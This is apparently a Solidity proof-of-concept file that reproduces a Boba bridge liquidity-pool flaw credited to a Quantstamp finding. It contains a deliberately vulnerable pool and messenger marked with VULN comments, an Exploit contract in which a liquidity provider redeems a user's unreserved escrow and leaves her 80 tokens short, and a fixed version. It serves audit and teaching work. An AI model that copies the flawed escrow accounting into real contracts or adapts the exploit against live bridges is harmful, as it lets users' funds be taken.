// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// Boba LP replyNeeded (Quantstamp). A fast withdraw escrows tokens on L2 and asks
// L1 to pay. If L1 cannot pay, it queues a compensation on L2. The escrow is not
// reserved, so the LP redeems it, and the L2 compensation is consumed even though
// the transfer reverts. The user cannot retry. Alice loses 80 tokens.

contract BridgeToken {
    string public symbol = "BOBA";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[f][msg.sender];
        if (a != type(uint256).max) allowance[f][msg.sender] = a - amt;
        balanceOf[f] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Messenger {
    struct Msg {
        address to;
        bytes data;
        bool used;
    }

    Msg[] public queue;

    function send(address to, bytes calldata data) external {
        queue.push(Msg(to, data, false));
    }

    function relay(uint256 i) external {
        Msg storage m = queue[i];
        require(!m.used, "used");
        m.used = true;
        (bool ok,) = m.to.call(m.data); // @> VULN: a failed compensation is consumed and cannot be relayed again
        ok;
    }

    function length() external view returns (uint256) {
        return queue.length;
    }
}

contract L2Pool {
    BridgeToken public immutable token;
    Messenger public immutable messenger;
    address public l1;
    mapping(address => uint256) public shares;
    uint256 public totalShares;

    constructor(BridgeToken _token, Messenger _messenger) {
        token = _token;
        messenger = _messenger;
    }

    function setL1(address a) external {
        l1 = a;
    }

    function addLiquidity(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        shares[msg.sender] += amount;
        totalShares += amount;
    }

    function clientDepositL2(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        messenger.send(l1, abi.encodeWithSelector(L1Pool.clientPayL1.selector, msg.sender, amount));
    }

    function withdrawLiquidity(uint256 shareAmount) external {
        require(shareAmount <= shares[msg.sender], "shares");
        uint256 bal = token.balanceOf(address(this));
        uint256 amount = shareAmount * bal / totalShares; // @> VULN: redemption uses the full balance, including the unreserved fast-withdraw escrow
        shares[msg.sender] -= shareAmount;
        totalShares -= shareAmount;
        token.transfer(msg.sender, amount);
    }

    function clientPayL2Settlement(address user, uint256 amount) external {
        require(msg.sender == address(messenger), "messenger");
        token.transfer(user, amount);
    }
}

contract L1Pool {
    BridgeToken public immutable token;
    Messenger public immutable messenger;
    address public l2;

    constructor(BridgeToken _token, Messenger _messenger) {
        token = _token;
        messenger = _messenger;
    }

    function setL2(address a) external {
        l2 = a;
    }

    function clientPayL1(address user, uint256 amount) external {
        require(msg.sender == address(messenger), "messenger");
        if (token.balanceOf(address(this)) < amount) {
            messenger.send(l2, abi.encodeWithSelector(L2Pool.clientPayL2Settlement.selector, user, amount));
        } else {
            token.transfer(user, amount);
        }
    }
}

contract Alice {
    function bridge(BridgeToken token, L2Pool pool, uint256 amount) external {
        token.approve(address(pool), amount);
        pool.clientDepositL2(amount);
    }
}

contract LossMarker {
    string public symbol = "LOST-BOBA";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

contract L2PoolFixed {
    BridgeToken public immutable token;
    Messenger public immutable messenger;
    address public l1;
    mapping(address => uint256) public shares;
    uint256 public totalShares;
    uint256 public reserved;

    constructor(BridgeToken _token, Messenger _messenger) {
        token = _token;
        messenger = _messenger;
    }

    function setL1(address a) external {
        l1 = a;
    }

    function addLiquidity(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        shares[msg.sender] += amount;
        totalShares += amount;
    }

    function clientDepositL2(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        reserved += amount;
        messenger.send(l1, abi.encodeWithSelector(L1Pool.clientPayL1.selector, msg.sender, amount));
    }

    function withdrawLiquidity(uint256 shareAmount) external {
        require(shareAmount <= shares[msg.sender], "shares");
        uint256 freeBal = token.balanceOf(address(this)) - reserved;
        uint256 amount = shareAmount * freeBal / totalShares;
        shares[msg.sender] -= shareAmount;
        totalShares -= shareAmount;
        token.transfer(msg.sender, amount);
    }

    function clientPayL2Settlement(address user, uint256 amount) external {
        require(msg.sender == address(messenger), "messenger");
        reserved -= amount;
        token.transfer(user, amount);
    }
}

contract AliceFixed {
    function bridge(BridgeToken token, L2PoolFixed pool, uint256 amount) external {
        token.approve(address(pool), amount);
        pool.clientDepositL2(amount);
    }
}

contract Exploit {
    address public constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 public constant LP_AMOUNT = 100 ether;
    uint256 public constant ALICE_AMOUNT = 80 ether;

    BridgeToken public token;
    Messenger public messenger;
    L2Pool public l2;
    L1Pool public l1;
    Alice public alice;
    LossMarker public marker;

    function run() external payable {
        token = new BridgeToken();
        messenger = new Messenger();
        l2 = new L2Pool(token, messenger);
        l1 = new L1Pool(token, messenger);
        alice = new Alice();
        marker = new LossMarker();
        l2.setL1(address(l1));
        l1.setL2(address(l2));
        token.mint(address(this), LP_AMOUNT);
        token.approve(address(l2), LP_AMOUNT);
        l2.addLiquidity(LP_AMOUNT);
        token.mint(address(alice), ALICE_AMOUNT);
        alice.bridge(token, l2, ALICE_AMOUNT);
        messenger.relay(0);
        l2.withdrawLiquidity(LP_AMOUNT);
        messenger.relay(1);
        require(token.balanceOf(address(alice)) == 0, "alice");
        require(token.balanceOf(address(this)) == LP_AMOUNT + ALICE_AMOUNT, "lp");
        marker.mint(SINK, ALICE_AMOUNT);
    }
}

contract FixedFlow {
    uint256 public constant LP_AMOUNT = 100 ether;
    uint256 public constant ALICE_AMOUNT = 80 ether;

    BridgeToken public token;
    Messenger public messenger;
    L2PoolFixed public l2;
    L1Pool public l1;
    AliceFixed public alice;

    function run() external {
        token = new BridgeToken();
        messenger = new Messenger();
        l2 = new L2PoolFixed(token, messenger);
        l1 = new L1Pool(token, messenger);
        alice = new AliceFixed();
        l2.setL1(address(l1));
        l1.setL2(address(l2));
        token.mint(address(this), LP_AMOUNT);
        token.approve(address(l2), LP_AMOUNT);
        l2.addLiquidity(LP_AMOUNT);
        token.mint(address(alice), ALICE_AMOUNT);
        alice.bridge(token, l2, ALICE_AMOUNT);
        messenger.relay(0);
        l2.withdrawLiquidity(LP_AMOUNT);
        messenger.relay(1);
    }
}
